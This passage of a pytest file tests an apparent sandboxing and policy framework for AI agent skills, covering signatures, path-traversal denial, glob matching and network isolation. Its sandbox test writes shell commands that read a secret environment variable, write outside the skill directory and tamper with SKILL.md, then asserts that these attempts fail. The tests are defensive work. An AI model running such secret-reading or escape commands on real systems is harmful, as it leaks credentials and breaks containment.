    c["integrity"]["signatures"][0]["role"] = "author"; W(d, c); assert core.verify_signatures(C(d)) == {TPUB: False}   # E2

def test_v08_scope_traversal_denied_by_policy():
    c = C(CASES / "v08-e6-scope-traversal")
    w = [e for x in core.match_policy(c, POL("solo-dev"))["capabilities"] for e in x["effects"] if e["effect"] == "write"]
    assert w and all(e["decision"] == "deny" for e in w)

def test_v08_glob_semantics():
    g = core.glob_match
    assert g("a/b.txt", "a/*") and not g("a/b/c", "a/*") and g("a/b/c", "a/**") and g("a", "a/**") and g("x/y/z.md", "**/z.md")
    assert core.glob_match("a.b.example.com", "*.example.com", "host") and not core.glob_match("example.com", "*.example.com", "host")
    assert core.glob_match("example.com", "**.example.com", "host") and not core.glob_match("10.evil.com", "10.*.*.*", "host")

def test_v08_codex_never_hides_deny():
    c = C(SAMPLE); r = core.compile_native(c, POL("strict-ci"), "codex", None, SAMPLE)
    assert r["config"]["approval_policy"] == "on-request" and r["lossy"]

@pytest.mark.skipif(not _shutil.which("bwrap"), reason="needs bubblewrap")
def test_v08_runner_sandbox_env_and_writes(tmp_path, monkeypatch):
    d = _cp(tmp_path, "v08-valid-signed"); monkeypatch.setenv("SECRET_TOKEN", "s3cr3t"); c = C(d)
    c["tests"]["setup"] = [["sh", "-c", "env | grep -c SECRET_TOKEN > leak.txt; echo x > $SKILL_DIR/../escaped.txt; true"]]
    c["tests"]["cases"][0]["run"] = ["sh", "-c", "echo tamper >> $SKILL_DIR/SKILL.md; echo hi"]; W(d, c)
    r = core.run_tests(d); assert r["sandbox"] == "bwrap" and r["network_isolated"]   # E10/E11
    assert not (tmp_path / "escaped.txt").exists() and "tamper" not in (d / "SKILL.md").read_text()

def test_v08_network_only_tests_no_L2(tmp_path, capsys):
    d = _cp(tmp_path, "v08-valid-signed"); c = C(d); c["tests"]["cases"][0]["network"] = True
    c["permissions"]["network"] = {"level": "scoped", "scope": ["example.com"]}; c["capabilities"][0]["effects"].append("network"); W(d, c)
    t = core.run_tests(d); assert not t["network_isolated"]   # E9
